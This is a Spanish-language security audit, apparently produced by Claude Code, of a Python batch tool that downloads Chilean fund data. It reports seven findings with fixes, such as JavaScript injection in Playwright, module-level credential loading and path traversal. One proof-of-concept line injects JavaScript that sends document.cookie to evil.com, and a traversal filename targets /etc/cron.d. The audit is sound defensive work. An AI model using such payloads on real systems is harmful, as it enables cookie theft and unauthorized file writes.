# Auditoría de Validación de Input y Seguridad de Inyección

**Fecha:** 2026-03-16
**Alcance:** Todos los archivos `.py` del proyecto `cartolas`
**Auditor:** Claude Code

---

## Resumen Ejecutivo

**Score de riesgo global: 3/10**

Este proyecto es un sistema batch/CLI de procesamiento de datos financieros. **No expone endpoints web, no usa bases de datos SQL/NoSQL, no acepta input de usuario externo y no parsea XML.** La superficie de ataque es significativamente menor que la de una aplicación web tradicional. Los hallazgos se concentran en: inyección JavaScript en Playwright, manejo de credenciales, y ausencia de validación TLS.

---

## Hallazgos

### 1. Inyección JavaScript en Playwright via f-string

| Campo | Detalle |
|-------|---------|
| **Severidad** | Media |
| **CWE** | CWE-79 (Cross-site Scripting) / CWE-94 (Code Injection) |
| **Archivo** | `cartolas/download.py`, líneas 81-82 |
| **Función** | `get_cartola_from_cmf()` |

**Evidencia:**

```python
page.evaluate(f"document.querySelector('#txt_inicio').value = '{start_date}';")
page.evaluate(f"document.querySelector('#txt_termino').value = '{end_date}';")
```

Las variables `start_date` y `end_date` se interpolan directamente en código JavaScript ejecutado por Playwright. Si estos valores contuvieran caracteres como `'; alert(1); '`, se ejecutaría código JS arbitrario en el contexto del navegador.

**Explotabilidad:** Baja en la práctica. Los valores provienen de `format_date_cmf()` que convierte objetos `date`/`datetime` a strings con formato fijo (`DD/MM/YYYY`). No hay input de usuario externo. Sin embargo, es un patrón inseguro que podría ser explotado si el flujo de datos cambia en el futuro.

**PoC (teórico):**
```python
# Si start_date fuera controlable por un atacante:
start_date = "'; fetch('https://evil.com/steal?cookie=' + document.cookie); '"
# Se ejecutaría JS arbitrario en el contexto de cmfchile.cl
```

**Remediación:**

```python
# Usar page.evaluate con argumentos en vez de f-strings
page.evaluate(
    "date => document.querySelector('#txt_inicio').value = date",
    start_date
)
page.evaluate(
    "date => document.querySelector('#txt_termino').value = date",
    end_date
)
```

---

### 2. Credenciales del BCCh cargadas a nivel de módulo

| Campo | Detalle |
|-------|---------|
| **Severidad** | Media |
| **CWE** | CWE-798 (Hardcoded Credentials) / CWE-522 (Insufficiently Protected Credentials) |
| **Archivo** | `eco/bcentral.py`, líneas 18, 24-25, 32 |
| **Función** | Nivel de módulo (importación) |

**Evidencia:**

```python
env_variables = dotenv_values(".env")
BCCH_PASS = env_variables["BCCH_PASS"]
BCCH_USER = env_variables["BCCH_USER"]
BCCh = bcchapi.Siete(usr=BCCH_USER, pwd=BCCH_PASS)
```

Las credenciales se cargan y la conexión API se establece al **importar** el módulo, no al usarlo. Esto significa:
- Cualquier `import eco.bcentral` (incluso transitivo) ejecuta login al BCCh.
- Si `.env` no existe, el módulo falla con `KeyError` no manejado.
- Las credenciales quedan como variables globales en memoria durante toda la ejecución.

**Remediación:**

```python
# Lazy initialization - cargar credenciales solo cuando se necesiten
_bcch_client = None

def get_bcch_client():
    global _bcch_client
    if _bcch_client is None:
        env_variables = dotenv_values(".env")
        _bcch_client = bcchapi.Siete(
            usr=env_variables["BCCH_USER"],
            pwd=env_variables["BCCH_PASS"]
        )
    return _bcch_client
```

---

### 3. Email del remitente hardcodeado en config.py

| Campo | Detalle |
|-------|---------|
| **Severidad** | Baja |
| **CWE** | CWE-798 (Hardcoded Credentials) |
| **Archivo** | `cartolas/config.py`, líneas 116-120 |

**Evidencia:**

```python
SENDER_MAIL, SENDER_NAME, TO_EMAILS = (
    "francisco@soyfocus.com",
    "Francisco",
    ["francisco@soyfocus.com"],
)
```

Emails personales hardcodeados en el código fuente (versionado en git). Si el repositorio es público o se comparte, estos datos quedan expuestos.

**Remediación:** Mover a `.env` o a un archivo de configuración no versionado.

---

### 4. Requests HTTP sin timeout explícito

| Campo | Detalle |
|-------|---------|
| **Severidad** | Baja |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption) |
| **Archivos** | `comparador/elmer.py:89`, `cartolas/fund_identifica.py:26` |

**Evidencia:**

```python
# elmer.py
response = requests.get(url)

# fund_identifica.py
response = requests.get(url, headers=headers)
```

Ambas llamadas a `requests.get()` no definen un `timeout`. Si el servidor remoto no responde, el proceso se bloquea indefinidamente.

**Remediación:**

```python
response = requests.get(url, timeout=30)
```

---

### 5. Respuestas HTTP sin validación de status code

| Campo | Detalle |
|-------|---------|
| **Severidad** | Baja |
| **CWE** | CWE-252 (Unchecked Return Value) |
| **Archivos** | `comparador/elmer.py:89-93`, `cartolas/fund_identifica.py:26-28` |

**Evidencia:**

```python
# elmer.py - solo verifica JSONDecodeError, no status code
response = requests.get(url)
datos = response.json()

# fund_identifica.py - no verifica nada
response = requests.get(url, headers=headers)
return response.text
```

No se verifica `response.status_code` ni se usa `response.raise_for_status()`. Un error HTTP (4xx, 5xx) podría resultar en datos corruptos procesados silenciosamente.

**Remediación:**

```python
response = requests.get(url, timeout=30)
response.raise_for_status()
```

---

### 6. download.suggested_filename usado sin sanitización para path

| Campo | Detalle |
|-------|---------|
| **Severidad** | Baja |
| **CWE** | CWE-22 (Path Traversal) |
| **Archivo** | `cartolas/download.py`, línea 112 |
| **Función** | `fetch_cartola_data()` |

**Evidencia:**

```python
download_path = cartolas_txt_folder / download.suggested_filename
download.save_as(download_path)
```

`download.suggested_filename` proviene del servidor remoto (CMF). Si el servidor fuera comprometido, podría devolver un nombre como `../../etc/cron.d/malicious` para escribir fuera de la carpeta esperada.

**Explotabilidad:** Muy baja. Requiere que el servidor de la CMF sea comprometido. Además, `Path.__truediv__` en Python resuelve `..` de forma segura en muchos casos, pero no en todos.

**Remediación:**

```python
from pathlib import PurePosixPath

safe_name = PurePosixPath(download.suggested_filename).name  # solo el nombre del archivo
download_path = cartolas_txt_folder / safe_name
download.save_as(download_path)
```

---

### 7. Generador de hash usa `random` en vez de `secrets`

| Campo | Detalle |
|-------|---------|
| **Severidad** | Informativa |
| **CWE** | CWE-330 (Use of Insufficiently Random Values) |
| **Archivo** | `utiles/file_tools.py`, líneas 18-35 |
| **Función** | `generate_hash_name()` |

**Evidencia:**

```python
random_string = "".join(
    random.choices(string.ascii_letters + string.digits, k=length)
)
hash_object = hashlib.sha256(random_string.encode())
```

Usa `random.choices()` (PRNG no criptográfico) para generar nombres de archivos temporales. En este contexto (nombres de imágenes de captcha), el impacto es nulo, pero es una mala práctica que podría propagarse.

**Remediación (opcional):**

```python
import secrets
random_string = secrets.token_hex(length)
```

---

## Checklist de Validación

| Categoría | Estado | Notas |
|-----------|--------|-------|
| **SQL Injection** | N/A | No usa bases de datos SQL. Datos en Parquet/JSON. |
| - Queries sin parametrizar | N/A | No hay queries SQL. |
| - Construcción dinámica de queries | N/A | Polars LazyFrame no es vulnerable a inyección SQL. |
| - Stored procedures | N/A | No aplica. |
| **NoSQL Injection** | N/A | No usa MongoDB ni bases NoSQL. |
| - Operadores no validados | N/A | No aplica. |
| - Ejecución JavaScript en queries | N/A | No aplica. |
| **Command Injection** | Pass | No usa `subprocess`, `os.system`, `eval()`, ni `exec()`. |
| - Spawning de procesos hijos | Pass | No hay spawning de procesos. |
| - Ejecución de comandos del sistema | Pass | No hay ejecución de comandos del sistema. |
| **XSS Prevention** | Parcial | Inyección JS en Playwright (Hallazgo #1). No es XSS clásico pero es el mismo patrón. |
| - Sanitización de input | Fail | f-strings en `page.evaluate()` sin sanitizar. |
| - Encoding de output | N/A | No genera HTML para usuarios. |
| - Headers Content-Type | N/A | No es servidor web. |
| **XXE** | N/A | No parsea XML. |
| - Configuración de parser XML | N/A | No aplica. |
| - File upload handling | N/A | No acepta uploads de usuarios. |
| **Path Traversal** | Parcial | `download.suggested_filename` sin sanitizar (Hallazgo #6). |
| - Operaciones de filesystem | Pass | Rutas hardcodeadas desde `config.py`, no de input externo. |
| - Prevención de listado de directorios | N/A | No es servidor web. |
| **Request Validation** | N/A | No es servidor web, no recibe requests HTTP. |
| - Límites de tamaño de body | N/A | No aplica. |
| - Parameter pollution | N/A | No aplica. |
| - Type checking | N/A | No aplica (sin input externo). |
| - Validación de campos requeridos | N/A | No aplica. |
| **Credenciales** | Parcial | Cargadas a nivel de módulo, email hardcodeado (Hallazgos #2, #3). |
| **TLS/Network** | Pass | Todas las URLs usan HTTPS. No se deshabilita verificación de certificados. |

---

## Top 5 Fixes Prioritarios

| # | Hallazgo | Esfuerzo | Reducción de Riesgo |
|---|----------|----------|---------------------|
| 1 | **Parametrizar `page.evaluate()`** (download.py:81-82) | 5 min | Alto - elimina inyección JS |
| 2 | **Agregar `timeout=30` a `requests.get()`** (elmer.py:89, fund_identifica.py:26) | 2 min | Medio - previene bloqueos infinitos |
| 3 | **Agregar `raise_for_status()`** a las respuestas HTTP | 2 min | Medio - previene datos corruptos silenciosos |
| 4 | **Sanitizar `download.suggested_filename`** (download.py:112) | 2 min | Medio - previene path traversal teórico |
| 5 | **Lazy init de credenciales BCCh** (bcentral.py:18-32) | 10 min | Bajo - mejor higiene de credenciales |

---

## Notas Finales

Este proyecto tiene una superficie de ataque reducida por su naturaleza batch/CLI:
- **No expone endpoints HTTP** (no Flask/FastAPI/Django)
- **No acepta input de usuarios externos**
- **No usa bases de datos SQL/NoSQL**
- **No parsea XML**
- **Todas las conexiones son HTTPS**
- **No usa `subprocess`, `eval()`, ni `exec()`**

Los hallazgos son principalmente de **defensa en profundidad** y **buenas prácticas**, no de vulnerabilidades activamente explotables en el contexto actual de uso.
